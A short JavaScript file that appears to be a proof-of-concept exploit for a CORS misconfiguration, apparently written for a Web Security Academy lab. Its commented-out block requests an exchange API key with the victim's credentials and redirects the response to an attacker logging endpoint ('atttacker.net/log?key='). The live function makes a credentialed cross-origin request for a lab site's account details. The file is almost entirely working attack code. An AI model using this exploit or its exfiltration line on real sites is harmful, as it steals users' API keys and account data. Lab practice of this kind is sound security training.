/*var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://btc-exchange/api/requestApiKey',true);
req.withCredentials = true;
req.send();

function reqListener() {
    location='//atttacker.net/log?key='+this.responseText;
};
*/

function cors() {
  var xhr = new XMLHttpRequest();
  xhr.onreadystatechange = function() {
    if (this.status == 200) {
      document.getElementById("report").innerHTML = alert(this.responseText);
    }
    else{
      document.getElementById("report").innerHTML = "Error";
    }
  };
  xhr.open("GET", "https://0ae900ed03354629c0fd4c1900870036.web-security-academy.net/accountDetails", true);
  xhr.withCredentials = true;
  xhr.send();
}
